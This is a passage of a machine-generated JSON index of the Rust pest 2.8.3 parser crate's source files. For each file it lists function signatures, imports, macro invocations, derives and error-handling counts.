        "impl_blocks": [],
        "uses": [
          "use criterion::{criterion_group, criterion_main, Criterion};",
          "use pest::Stack;",
          "use core::iter::repeat;"
        ],
        "macros": [
          "b.bench_function(stringify!(push - restore - $kind), |b| {",
          ".bench_function(stringify!(push - clear - $kind), |b| {",
          ".bench_function(stringify!(pop - restore - $kind), |b| {",
          ".bench_function(stringify!(pop - clear - $kind), |b| {",
          "test_series!(small);",
          "test_series!(medium);",
          "test_series!(large);",
          "criterion_group!(benchmarks, benchmark);",
          "criterion_main!(benchmarks);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/prec_climber.rs",
        "function_defs": [
          "fn bitor(mut self, rhs: Self) -> Self {",
          "fn assign_next<R: RuleType>(op: &mut Operator<R>, next: Operator<R>) {",
          "fn get(&self, rule: &R) -> Option<(u32, Assoc)> {",
          "fn climb_rec<'i, P, F, G, T>("
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::borrow::Cow;",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::iter::Peekable;",
          "use core::ops::BitOr;",
          "use crate::iterators::Pair;",
          "use crate::RuleType;"
        ],
        "macros": [
          "prec_climber!(",
          "prec_climber!(",
          "prec_climber!( @assoc $assoc ),",
          "prec_climber!(",
          "///         _ => unreachable!()"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/error.rs",
        "function_defs": [
          "fn from(value: Position<'_>) -> Self {",
          "fn from(value: Span<'_>) -> Self {",
          "fn tokens_helper_messages(",
          "fn start(&self) -> (usize, usize) {",
          "fn spacing(&self) -> String {",
          "fn underline(&self) -> String {",
          "fn message(&self) -> String {",
          "fn parsing_error_message<F>(positives: &[R], negatives: &[R], mut f: F) -> String",
          "fn enumerate<F>(rules: &[R], f: &mut F) -> String",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn visualize_whitespace(input: &str) -> String {",
          "fn source_code(&self) -> Option<&dyn SourceCode> {",
          "fn labels(&self) -> Option<Box<dyn Iterator<Item = LabeledSpan>>> {",
          "fn help<'a>(&'a self) -> Option<Box<dyn fmt::Display + 'a>> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn display_parsing_error_mixed() {",
          "fn display_parsing_error_positives() {",
          "fn display_parsing_error_negatives() {",
          "fn display_parsing_error_unknown() {",
          "fn display_custom_pos() {",
          "fn display_custom_span_two_lines() {",
          "fn display_custom_span_three_lines() {",
          "fn display_custom_span_two_lines_inverted_cols() {",
          "fn display_custom_span_end_after_newline() {",
          "fn display_custom_span_empty() {",
          "fn mapped_parsing_error() {",
          "fn error_with_path() {",
          "fn underline_with_tabs() {",
          "fn pos_to_lcl_conversion() {",
          "fn span_to_lcl_conversion() {",
          "fn miette_error() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl From<Position<'_>> for LineColLocation {",
          "impl From<Span<'_>> for LineColLocation {",
          "impl ParsingToken {"
        ],
        "uses": [
          "use crate::parser_state::{ParseAttempts, ParsingToken, RulesCallStack};",
          "use alloc::borrow::Cow;",
          "use alloc::borrow::ToOwned;",
          "use alloc::boxed::Box;",
          "use alloc::collections::{BTreeMap, BTreeSet};",
          "use alloc::format;",
          "use alloc::string::String;",
          "use alloc::string::ToString;",
          "use alloc::vec;",
          "use alloc::vec::Vec;",
          "use core::cmp;",
          "use core::fmt;",
          "use core::mem;",
          "use crate::position::Position;",
          "use crate::span::Span;",
          "use crate::RuleType;",
          "use alloc::string::ToString;",
          "use core::fmt;",
          "use std::boxed::Box;",
          "use crate::error::LineColLocation;",
          "use super::{Error, RuleType};",
          "use miette::{Diagnostic, LabeledSpan, SourceCode};",
          "use super::*;",
          "use alloc::vec;"
        ],
        "macros": [
          "let mut helper_tokens_message = format!(\"{spacing}note: {header} \");",
          "format!(\"`{}`\", token)",
          "/// println!(\"{}\", error);",
          "/// println!(\"{}\", error);",
          "let visualize_ws = matches!(chars.next(), Some('\\n') | Some('\\r'))",
          "|| matches!(chars.last(), Some('\\n') | Some('\\r'));",
          "/// assert_eq!(Some(\"file.rs\"), error.path());",
          "help_lines.push(format!(",
          "help_lines.push(format!(\"{spacing}      - {message}\"));",
          "help_lines.push(format!(\"{spacing}help: {helper_message}\"));",
          "let line_str_len = format!(\"{}\", line).len();",
          "(false, false) => format!(",
          "(false, true) => format!(\"unexpected {}\", Error::enumerate(negatives, &mut f)),",
          "(true, false) => format!(\"expected {}\", Error::enumerate(positives, &mut f)),",
          "2 => format!(\"{} or {}\", f(&rules[0]), f(&rules[1])),",
          "format!(\"{}, or {}\", separated, non_separated)",
          ".map(|path| format!(\"{}:\", path))",
          "format!(",
          "format!(",
          "format!(",
          "/// println!(\"{}\", variant.message());",
          "format!(\"{:?}\", r)",
          "write!(f, \"{}\", self.format())",
          "ErrorVariant::ParsingError { .. } => write!(f, \"parsing error: {}\", self.message",
          "ErrorVariant::CustomError { .. } => write!(f, \"{}\", self.message()),",
          "write!(f, \"Failure to parse at {:?}\", self.0.line_col)",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert!(start.at_start());",
          "assert!(end.at_end());",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert!(start.at_start());",
          "assert!(end.at_end());",
          "assert_eq!(",
          "format!(\"{}\", error),",
          ".renamed_rules(|n| format!(\"{}\", n + 1));",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(",
          "format!(\"{}\", error),",
          "assert_eq!(LineColLocation::Pos(pos.line_col()), pos.into());",
          "assert_eq!(",
          "assert_eq!(",
          "format!(\"{:?}\", miette_error),"
        ],
        "derives": [
          "#[derive(Clone, Debug, Eq, Hash, PartialEq)]",
          "#[derive(Clone, Debug, Eq, Hash, PartialEq)]",
          "#[derive(Clone, Debug, Eq, Hash, PartialEq)]",
          "#[derive(Clone, Debug, Eq, Hash, PartialEq)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 36
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/token.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::position::Position;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, Debug, Eq, Hash, PartialEq)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::fmt::Debug;",
          "use core::hash::Hash;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/parser_state.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn limit_reached(&self) -> bool {",
          "fn increment_depth(&mut self) {",
          "fn new(deepest: ParseAttempt<R>) -> RulesCallStack<R> {",
          "fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {",
          "fn as_str<'a: 'i>(&'a self) -> &'a str {",
          "fn from(value: Cow<'static, str>) -> Self {",
          "fn as_borrowed_or_rc(&self) -> BorrowedOrArc<'i> {",
          "fn call_stacks_number(&self) -> usize {",
          "fn try_add_new_stack_rule(&mut self, rule: R, start_index: usize) {",
          "fn try_add_new_token(",
          "fn nullify_expected_tokens(&mut self, new_max_position: usize) {",
          "fn default() -> Self {",
          "fn inc_call_check_limit(mut self: Box<Self>) -> ParseResult<Box<Self>> {",
          "fn reached_call_limit(&self) -> bool {",
          "fn attempts_at(&self, pos: usize) -> usize {",
          "fn track(",
          "fn handle_token_parse_result(",
          "fn constrain_idxs(start: i32, end: Option<i32>, len: usize) -> Option<Range<usize>> {",
          "fn normalize_index(i: i32, len: usize) -> Option<usize> {",
          "fn normalize_index_pos() {",
          "fn normalize_index_neg() {"
        ],
        "struct_defs": [
          "struct CallLimitTracker {"
        ],
        "impl_blocks": [
          "impl Default for CallLimitTracker {",
          "impl CallLimitTracker {",
          "impl Display for ParsingToken {",
          "impl From<Cow<'static, str>> for BorrowedOrArc<'_> {"
        ],
        "uses": [
          "use alloc::borrow::{Cow, ToOwned};",
          "use alloc::boxed::Box;",
          "use alloc::collections::BTreeSet;",
          "use alloc::rc::Rc;",
          "use alloc::string::String;",
          "use alloc::sync::Arc;",
          "use alloc::vec;",
          "use alloc::vec::Vec;",
          "use core::fmt::{Debug, Display, Formatter};",
          "use core::num::NonZeroUsize;",
          "use core::ops::Deref; // used in BorrowedOrRc.as_str",
          "use core::ops::Range;",
          "use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};",
          "use crate::error::{Error, ErrorVariant};",
          "use crate::iterators::pairs::new;",
          "use crate::iterators::{pairs, QueueableToken};",
          "use crate::position::Position;",
          "use crate::span::Span;",
          "use crate::stack::Stack;",
          "use crate::RuleType;",
          "use super::*;"
        ],
        "macros": [
          "ParsingToken::Sensitive { token } => write!(f, \"{token}\"),",
          "ParsingToken::Insensitive { token } => write!(f, \"{}\", token.to_uppercase()),",
          "ParsingToken::Range { start, end } => write!(f, \"{start}..{end}\"),",
          "ParsingToken::BuiltInRule => write!(f, \"BUILTIN_RULE\"),",
          "if matches!(call_stack.deepest, ParseAttempt::Token) {",
          "if matches!(call_stack.deepest, ParseAttempt::Token) {",
          "/// assert_eq!(position.pos(), 0);",
          "/// assert_eq!(atomicity, Atomicity::NonAtomic);",
          "/// assert_eq!(pairs.len(), 1);",
          "if !matches!(new_state.atomicity, Atomicity::Atomic) {",
          "_ => unreachable!(),",
          "/// assert_eq!(find[0].as_str(), \"c\")",
          "/// assert_eq!(pairs.len(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 2);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert!(result.is_ok());",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 1);",
          "/// assert!(result.is_err());",
          "/// assert_eq!(result.unwrap_err().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 2);",
          "/// assert!(result.is_err());",
          "/// assert_eq!(result.unwrap_err().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.as_ref().unwrap().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 1);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 2);",
          "/// assert!(result.is_err());",
          "/// assert_eq!(result.unwrap_err().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 1);",
          "/// assert!(result.is_err());",
          "/// assert_eq!(result.unwrap_err().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 1);",
          "/// assert!(result.is_err());",
          "/// assert_eq!(result.unwrap_err().position().pos(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 2);",
          "/// assert!(result.is_ok());",
          "/// assert!(result.is_err());",
          "/// assert!(result.is_err());",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(pairs.len(), 0);",
          "/// assert_eq!(pairs.len(), 0);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 1);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 2);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 2);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 10);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 4);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 4);",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().pos(), 1);",
          "/// assert!(result.is_err());",
          "/// assert!(catch_panic.is_err());",
          "assert_eq!(normalize_index(4, 6), Some(4));",
          "assert_eq!(normalize_index(5, 5), Some(5));",
          "assert_eq!(normalize_index(6, 3), None);",
          "assert_eq!(normalize_index(-4, 6), Some(2));",
          "assert_eq!(normalize_index(-5, 5), Some(0));",
          "assert_eq!(normalize_index(-6, 3), None);"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]",
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]",
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Hash, PartialEq, Eq, Clone, PartialOrd, Ord)]",
          "#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord)]",
          "#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 70
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/span.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Span<'i>) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn get() {",
          "fn get_fails() {",
          "fn span_comp() {",
          "fn split() {",
          "fn lines_mid() {",
          "fn lines_eof() {",
          "fn lines_span() {",
          "fn get_input_of_span() {",
          "fn merge_contiguous() {",
          "fn merge_overlapping() {",
          "fn merge_non_contiguous() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::fmt;",
          "use core::hash::{Hash, Hasher};",
          "use core::ops::{Bound, RangeBounds};",
          "use core::ptr;",
          "use core::str;",
          "use crate::position;",
          "use super::*;",
          "use alloc::borrow::ToOwned;",
          "use alloc::vec::Vec;"
        ],
        "macros": [
          "debug_assert!(input.get(start..end).is_some());",
          "/// assert_eq!(None, Span::new(input, 100, 0));",
          "/// assert!(Span::new(input, 0, input.len()).is_some());",
          "/// assert!(orl.is_some());",
          "/// assert_eq!(orl.unwrap().as_str(), \"orl\");",
          "/// assert_eq!(span.start(), 0);",
          "/// assert_eq!(span.end(), 0);",
          "/// assert_eq!(span.start_pos(), start);",
          "/// assert_eq!(span.end_pos(), end);",
          "/// assert_eq!(span.split(), (start, end));",
          "/// assert_eq!(span.as_str(), \"b\");",
          "/// assert_eq!(span.get_input(), input);",
          "/// assert_eq!(span.lines().collect::<Vec<_>>(), vec![\"b\\n\", \"c\"]);",
          "/// assert_eq!(span.lines_span().collect::<Vec<_>>(), vec![Span::new(input, 2, 4",
          "/// assert_eq!(merged, Span::new(input, 1, 11).unwrap());",
          "/// assert_eq!(merged, Span::new(input, 1, 11).unwrap());",
          "/// assert!(merged.is_none());",
          "assert_eq!(span.as_str(), \"123abc\");",
          "assert_eq!(span.input, input);",
          "assert!(span1.is_some());",
          "assert_eq!(span1.unwrap().input, input);",
          "assert_eq!(span1.unwrap().as_str(), \"123\");",
          "assert!(span2.is_some());",
          "assert_eq!(span2.unwrap().input, input);",
          "assert_eq!(span2.unwrap().as_str(), \"123abc\");",
          "assert!(span3.is_some());",
          "assert_eq!(span3.unwrap().input, input);",
          "assert_eq!(span3.unwrap().as_str(), \"abc\");",
          "assert!(span4.is_some());",
          "assert_eq!(span4.unwrap().input, input);",
          "assert_eq!(span4.unwrap().as_str(), \"\");",
          "assert!(span1.is_none());",
          "assert!(span2.is_none());",
          "assert!(span2.is_none());",
          "assert!(span != span3);",
          "assert!(end.skip(1));",
          "assert_eq!(span.split(), (start, end));",
          "assert_eq!(lines.len(), 2);",
          "assert_eq!(lines[0], \"abc\\n\".to_owned());",
          "assert_eq!(lines[1], \"def\\n\".to_owned());",
          "assert_eq!(lines, lines_span) // Verify parity with lines_span()",
          "assert!(span.end_pos().at_end());",
          "assert_eq!(span.end(), 11);",
          "assert_eq!(lines.len(), 2);",
          "assert_eq!(lines[0], \"def\\n\".to_owned());",
          "assert_eq!(lines[1], \"ghi\".to_owned());",
          "assert_eq!(lines, lines_span) // Verify parity with lines_span()",
          "assert_eq!(lines_span.len(), 2);",
          "assert_eq!(lines_span[0], Span::new(input, 0, 4).unwrap());",
          "assert_eq!(lines_span[1], Span::new(input, 4, 8).unwrap());",
          "assert_eq!(",
          "assert_eq!(span.get_input(), input);",
          "assert_eq!(merged, Span::new(input, 1, 11).unwrap());",
          "assert_eq!(merged, Span::new(input, 1, 11).unwrap());",
          "assert!(merged.is_none());"
        ],
        "derives": [
          "#[derive(Clone, Copy)]"
        ],
        "error_handling": 51
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/pratt_parser.rs",
        "function_defs": [
          "fn bitor(mut self, rhs: Self) -> Self {",
          "fn assign_next<R: RuleType>(op: &mut Op<R>, next: Op<R>) {",
          "fn default() -> Self {",
          "fn expr<P: Iterator<Item = Pair<'i, R>>>(&mut self, pairs: &mut Peekable<P>, rbp: Prec) -> T {",
          "fn nud<P: Iterator<Item = Pair<'i, R>>>(&mut self, pairs: &mut Peekable<P>) -> T {",
          "fn led<P: Iterator<Item = Pair<'i, R>>>(&mut self, pairs: &mut Peekable<P>, lhs: T) -> T {",
          "fn lbp<P: Iterator<Item = Pair<'i, R>>>(&mut self, pairs: &mut Peekable<P>) -> Prec {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::iter::Peekable;",
          "use core::marker::PhantomData;",
          "use core::ops::BitOr;",
          "use alloc::boxed::Box;",
          "use alloc::collections::BTreeMap;",
          "use crate::iterators::Pair;",
          "use crate::RuleType;"
        ],
        "macros": [
          "///             _          => unreachable!(),",
          "///             _          => unreachable!(),",
          "///             _          => unreachable!(),",
          "///             _          => unreachable!(),",
          "None => panic!(\"Could not map {}, no `.map_prefix(...)` specified\", pair),",
          "_ => panic!(\"Expected prefix or primary expression, found {}\", pair),",
          "None => panic!(\"Could not map {}, no `.map_infix(...)` specified\", pair),",
          "None => panic!(\"Could not map {}, no `.map_postfix(...)` specified\", pair),",
          "_ => panic!(\"Expected postfix or infix expression, found {}\", pair),",
          "None => panic!(\"Expected operator, found {}\", pair),"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]"
        ],
        "error_handling": 15
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/stack.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn index(&self, range: Range<usize>) -> &[T] {",
          "fn snapshot_with_empty() {",
          "fn snapshot_twice() {",
          "fn restore_without_snapshot() {",
          "fn snapshot_pop_restore() {",
          "fn snapshot_pop_push_restore() {",
          "fn snapshot_push_pop_restore() {",
          "fn snapshot_push_clear() {",
          "fn snapshot_pop_clear() {",
          "fn stack_ops() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::vec;",
          "use alloc::vec::Vec;",
          "use core::ops::{Index, Range};",
          "use super::Stack;"
        ],
        "macros": [
          "debug_assert_eq!(self.popped.len(), new_len);",
          "debug_assert!(self.popped.is_empty());",
          "debug_assert!(self.lengths.is_empty());",
          "assert!(stack.is_empty());",
          "assert!(stack.is_empty());",
          "assert_eq!(stack[0..stack.len()], [0]);",
          "assert_eq!(stack[0..stack.len()], [0; 0]);",
          "assert_eq!(stack[0..stack.len()], [0]);",
          "assert_eq!(stack[0..stack.len()], [0]);",
          "assert_eq!(stack[0..stack.len()], [0]);",
          "assert_eq!(stack[0..stack.len()], [0, 1]);",
          "assert_eq!(stack[0..stack.len()], [0]);",
          "assert!(stack.is_empty());",
          "assert_eq!(stack.peek(), None);",
          "assert_eq!(stack.pop(), None);",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&0));",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&1));",
          "assert_eq!(stack.pop(), Some(1));",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&0));",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&2));",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&3));",
          "assert_eq!(stack.pop(), Some(3));",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&2));",
          "assert_eq!(stack.pop(), Some(2));",
          "assert!(!stack.is_empty());",
          "assert_eq!(stack.peek(), Some(&0));",
          "assert_eq!(stack.pop(), Some(0));",
          "assert!(stack.is_empty());",
          "assert_eq!(stack.pop(), Some(2));",
          "assert_eq!(stack.pop(), Some(0));",
          "assert_eq!(stack.pop(), None);",
          "assert_eq!(stack.pop(), Some(3));",
          "assert_eq!(stack.pop(), Some(2));",
          "assert_eq!(stack.pop(), Some(0));",
          "assert_eq!(stack.pop(), None);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/position.rs",
        "function_defs": [
          "fn skip_until_basic(&mut self, strings: &[&str]) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Position<'i>) -> bool {",
          "fn partial_cmp(&self, other: &Position<'i>) -> Option<Ordering> {",
          "fn cmp(&self, other: &Position<'i>) -> Ordering {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn empty() {",
          "fn parts() {",
          "fn line_col() {",
          "fn line_of() {",
          "fn line_of_empty() {",
          "fn line_of_new_line() {",
          "fn line_of_between_new_line() {",
          "fn measure_skip(input: &str, pos: usize, n: usize) -> Option<usize> {",
          "fn skip_empty() {",
          "fn skip() {",
          "fn skip_until() {",
          "fn match_range() {",
          "fn match_insensitive() {",
          "fn cmp() {",
          "fn cmp_panic() {",
          "fn hash() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{Hash, Hasher};",
          "use core::ops::Range;",
          "use core::ptr;",
          "use core::str;",
          "use crate::span;",
          "use super::*;",
          "use std::collections::HashSet;"
        ],
        "macros": [
          "debug_assert!(input.get(pos..).is_some());",
          "/// assert_eq!(Position::new(heart, 1), None);",
          "/// assert_ne!(Position::new(heart, cheart.len_utf8()), None);",
          "/// assert_eq!(start.pos(), 0);",
          "/// assert_eq!(start.pos(), 0);",
          "/// assert_eq!(span.start(), 0);",
          "/// assert_eq!(span.end(), 0);",
          "panic!(\"span created from positions from different inputs\")",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().line_col(), (2, 2));",
          "panic!(\"position out of bounds\");",
          "None => unreachable!(),",
          "/// assert!(result.is_ok());",
          "/// assert_eq!(result.unwrap().position().line_of(), \"a\");",
          "panic!(\"position out of bounds\");",
          "matches!(self.input[self.pos..].chars().next(), Some(cc) if c == cc)",
          "assert!(Position::new(input, 0).unwrap().match_string(\"\"));",
          "assert!(!Position::new(input, 0).unwrap().match_string(\"a\"));",
          "assert!(Position::new(input, 0).unwrap().match_string(\"asd\"));",
          "assert!(Position::new(input, 3).unwrap().match_string(\"asdf\"));",
          "assert_eq!(Position::new(input, 0).unwrap().line_col(), (1, 1));",
          "assert_eq!(Position::new(input, 1).unwrap().line_col(), (1, 2));",
          "assert_eq!(Position::new(input, 2).unwrap().line_col(), (1, 3));",
          "assert_eq!(Position::new(input, 3).unwrap().line_col(), (1, 4));",
          "assert_eq!(Position::new(input, 4).unwrap().line_col(), (2, 1));",
          "assert_eq!(Position::new(input, 5).unwrap().line_col(), (2, 2));",
          "assert_eq!(Position::new(input, 6).unwrap().line_col(), (2, 3));",
          "assert_eq!(Position::new(input, 7).unwrap().line_col(), (3, 1));",
          "assert_eq!(Position::new(input, 8).unwrap().line_col(), (3, 2));",
          "assert_eq!(Position::new(input, 11).unwrap().line_col(), (3, 3));",
          "assert_eq!(Position::new(input, 7).unwrap().line_col(), (1, 6));",
          "assert_eq!(Position::new(input, 0).unwrap().line_of(), \"a\\rb\\n\");",
          "assert_eq!(Position::new(input, 1).unwrap().line_of(), \"a\\rb\\n\");",
          "assert_eq!(Position::new(input, 2).unwrap().line_of(), \"a\\rb\\n\");",
          "assert_eq!(Position::new(input, 3).unwrap().line_of(), \"a\\rb\\n\");",
          "assert_eq!(Position::new(input, 4).unwrap().line_of(), \"c\\r\\n\");",
          "assert_eq!(Position::new(input, 5).unwrap().line_of(), \"c\\r\\n\");",
          "assert_eq!(Position::new(input, 6).unwrap().line_of(), \"c\\r\\n\");",
          "assert_eq!(Position::new(input, 7).unwrap().line_of(), \"d\u55e8\");",
          "assert_eq!(Position::new(input, 8).unwrap().line_of(), \"d\u55e8\");",
          "assert_eq!(Position::new(input, 11).unwrap().line_of(), \"d\u55e8\");",
          "assert_eq!(Position::new(input, 0).unwrap().line_of(), \"\");",
          "assert_eq!(Position::new(input, 0).unwrap().line_of(), \"\\n\");",
          "assert_eq!(Position::new(input, 1).unwrap().line_of(), \"\\n\");",
          "assert_eq!(measure_skip(input, 0, 0), Some(0));",
          "assert_eq!(measure_skip(input, 0, 1), None);",
          "assert_eq!(measure_skip(input, 0, 0), Some(0));",
          "assert_eq!(measure_skip(input, 0, 1), Some(1));",
          "assert_eq!(measure_skip(input, 1, 1), Some(3));",
          "assert_eq!(test_pos.pos(), 0);",
          "assert_eq!(test_pos.pos(), 1);",
          "assert_eq!(test_pos.pos(), 0);",
          "assert_eq!(test_pos.pos(), 3);",
          "assert!(!test_pos.skip_until(&[\"z\"]));",
          "assert_eq!(test_pos.pos(), 5);",
          "assert!(Position::new(input, 0).unwrap().match_range('a'..'c'));",
          "assert!(Position::new(input, 0).unwrap().match_range('b'..'b'));",
          "assert!(!Position::new(input, 0).unwrap().match_range('a'..'a'));",
          "assert!(!Position::new(input, 0).unwrap().match_range('c'..'c'));",
          "assert!(Position::new(input, 0).unwrap().match_range('a'..'\u55e8'));",
          "assert!(Position::new(input, 0).unwrap().match_insensitive(\"asd\"));",
          "assert!(Position::new(input, 3).unwrap().match_insensitive(\"asdf\"));",
          "assert!(end.skip(1));",
          "assert_eq!(result, Ordering::Less);"
        ],
        "derives": [
          "#[derive(Clone, Copy)]"
        ],
        "error_handling": 51
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/macros.rs",
        "function_defs": [
          "fn parse(_: Rule, input: &str) -> Result<Pairs<'_, Rule>, Error<Rule>> {",
          "fn parses_to() {",
          "fn missing_end() {",
          "fn empty() {",
          "fn fails_with() {",
          "fn wrong_positives() {",
          "fn wrong_negatives() {",
          "fn wrong_pos() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Parser<Rule> for AbcParser {"
        ],
        "uses": [
          "use $crate::Parser;",
          "use $crate::Parser;",
          "use super::super::error::Error;",
          "use super::super::iterators::Pairs;",
          "use super::super::{state, Parser};",
          "use alloc::format;",
          "use alloc::vec;",
          "use alloc::vec::Vec;"
        ],
        "macros": [
          "let expected = format!(\"expected Start {{ rule: {:?}, pos: Position {{ pos: {} }",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "let expected = format!(\"expected End {{ rule: {:?}, pos: Position {{ pos: {} }} ",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $end,",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "let expected = format!(\"expected Start {{ rule: {:?}, pos: Position {{ pos: {} }",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $start,",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "let expected = format!(\"expected End {{ rule: {:?}, pos: Position {{ pos: {} }} ",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $end,",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "consumes_to!($rules, $tokens, [ $( $names $calls ),* ]);",
          "let expected = format!(\"expected Start {{ rule: {:?}, pos: Position {{ pos: {} }",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $start,",
